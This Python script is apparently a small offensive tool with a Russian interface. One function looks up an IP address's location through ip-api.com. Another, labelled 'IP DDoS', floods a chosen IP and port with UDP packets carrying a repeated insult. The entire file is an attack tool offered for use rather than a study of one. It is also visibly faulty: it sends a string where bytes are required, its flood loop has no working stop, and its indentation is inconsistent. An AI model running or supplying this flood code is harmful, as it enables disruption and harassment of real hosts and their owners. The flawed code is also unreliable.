import os
import requests, time, socket
from colorama import Style, Fore

logo = Fore.RED + """
 __________            __     
 \______   \   ____   |  | __ 
  |    |  _/  /  _ \  |  |/ / 
  |    |   \ (  <_> ) |    <  
  |______  /  \____/  |__|_ \ 
         \/                \/ 
""" + Fore.GREEN + """ https://t.me/SquateDev | Version : 0.1
""" + Fore.WHITE

inputs_text = Fore.BLUE + " [" + Fore.WHITE + "1" + Fore.BLUE + "]" + Fore.WHITE + " IP DDoS" + Fore.BLUE + "\n [" + Fore.WHITE + "2" + Fore.BLUE + "]" + Fore.WHITE + " IP Search " + Fore.YELLOW + "\n Выберите Категорию : " + Fore.WHITE

navigator = Fore.YELLOW + " Введите " + Fore.RED + "IP Address" + Fore.YELLOW + " : " + Fore.WHITE

exit_text = Fore.BLUE+"\n\n ["+Fore.WHITE+"1"+Fore.BLUE+"]"+Fore.WHITE+" Домой"+Fore.YELLOW+"\n Введите Число : "

def consoleclear():
	os.system("clear")


def inputs():
    while True:
        try:
            choice = int(input(inputs_text))
            if choice == 1:
                ipddos()
                break
            elif choice == 2:
                ipsearch()
                break
        except ValueError:
            os.system("clear")
            main()

def main():
    os.system("clear")
    print(logo)
    inputs()

def ipsearch():
    os.system("clear")
    print(logo)
    while True:
        try:
            ipadd = str(input(navigator))
            parts = ipadd.split('.')
            if len(parts) != 4:
                raise ValueError

            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    raise ValueError            
            response = requests.get(f'http://ip-api.com/json/{ipadd}')
            data = response.json()

            if response.status_code == 200 and data['status'] == 'success':
                print(Fore.GREEN + f" Страна: {data.get('country', 'N/A')}")
                print(Fore.GREEN + f" Регион: {data.get('regionName', 'N/A')}")
                print(Fore.GREEN + f" Город: {data.get('city', 'N/A')}")
                print(Fore.GREEN + f" Почтовый индекс: {data.get('zip', 'N/A')}")
                print(Fore.GREEN + f" ISP: {data.get('isp', 'N/A')}")
                print(Fore.GREEN + f" Организация: {data.get('org', 'N/A')}")
                print(Fore.GREEN + f" Широта: {data.get('lat', 'N/A')}")
                print(Fore.GREEN + f" Долгота: {data.get('lon', 'N/A')}")
                print(Fore.GREEN + f" Часовой пояс: {data.get('timezone', 'N/A')}")
                print(Fore.GREEN + f" AS: {data.get('as', 'N/A')}")
                for key, value in data.items():
                    print(Fore.YELLOW + f" {key}: {value}")
                ex = int(input(exit_text));
                if ex == 1:
                  consoleclear();
                  main()
            else:
                print(Fore.RED + " Ошибка при получении данных:", data.get("message", "Неизвестная ошибка"))
                time.sleep(1.5)
                consoleclear();
                main();
            break
        except ValueError:
            print(Fore.RED + " Пожалуйста, введите действительный IP-адрес в формате xxx.xxx.xxx.xxx")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f" Произошла ошибка запроса: {e}")
        except Exception as e:
            print(Fore.RED + f" Произошла ошибка: {e}")

def ipddos():
    os.system("clear")
    print(logo)
    
    ipadd = ""
    port = 0
    stop_sending = False

    while True:
        try:
            ipadd = str(input(navigator))
            parts = ipadd.split('.')
            if len(parts) != 4:
                raise ValueError

            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    raise ValueError
            
            port = int(input(Fore.YELLOW+" Введите порт "+Fore.WHITE+" : "))
            if port < 1 or port > 65535:
                raise ValueError(" Порт должен быть в диапазоне от 1 до 65535.")
            print(Fore.YELLOW+" Отправка пошла, чтобы остановить введите 1 также, вы вернётесь домой !")   
            ex = int(input(exit_text))
            if ex == 1:
                stop_sending = True
                break

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                while not stop_sending:
                    message = "Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый Я конченый "
                    s.sendto(message, (ipadd, port))
                    time.sleep(0.1) 

            break
        except ValueError as ve:
            print(Fore.RED + f" Ошибка: {ve}")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f" Произошла ошибка запроса: {e}")
        except Exception as e:
            print(Fore.RED + f" Произошла ошибка: {e}")
    if stop_sending:
        print(Fore.YELLOW + " Отправка сообщений остановлена.");
	consoleclear()
	main();

main()
